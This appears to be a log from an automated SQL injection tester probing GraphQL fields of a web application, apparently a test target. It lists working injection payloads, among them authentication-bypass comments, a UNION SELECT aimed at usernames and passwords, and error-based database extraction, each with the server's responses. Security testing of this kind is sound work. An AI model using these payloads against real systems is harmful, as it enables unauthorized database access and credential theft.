2026-02-02 23:16:04,712 | INFO    | InjectionTester      | admin_comment_dash             | paste.title          | POST | success  |  0.004s | payload=[admin' --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 47}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:04,716 | INFO    | InjectionTester      | admin_comment_hash             | paste.title          | POST | success  |  0.003s | payload=[admin' #] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 46}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:04,720 | INFO    | InjectionTester      | admin_comment_star             | paste.title          | POST | success  |  0.003s | payload=[admin'/*] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 46}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:04,723 | INFO    | InjectionTester      | union_select_123               | paste.title          | POST | success  |  0.003s | payload=[' UNION SELECT 1,2,3 --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 61}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:04,727 | INFO    | InjectionTester      | union_select_users             | paste.title          | POST | success  |  0.003s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 93}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:04,731 | INFO    | InjectionTester      | error_based_version            | paste.title          | POST | success  |  0.003s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 159}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loc…]
2026-02-02 23:16:04,734 | INFO    | InjectionTester      | error_based_extractvalue       | paste.title          | POST | success  |  0.003s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 103}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loc…]
2026-02-02 23:16:04,738 | INFO    | InjectionTester      | boolean_true                   | paste.title          | POST | success  |  0.003s | payload=[' AND 1=1 --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 50}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:04,741 | INFO    | InjectionTester      | boolean_false                  | paste.title          | POST | success  |  0.003s | payload=[' AND 1=0 --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 50}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:04,757 | INFO    | InjectionTester      | single_quote                   | systemDiagnostics.username | POST | success  |  0.015s | payload=['] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
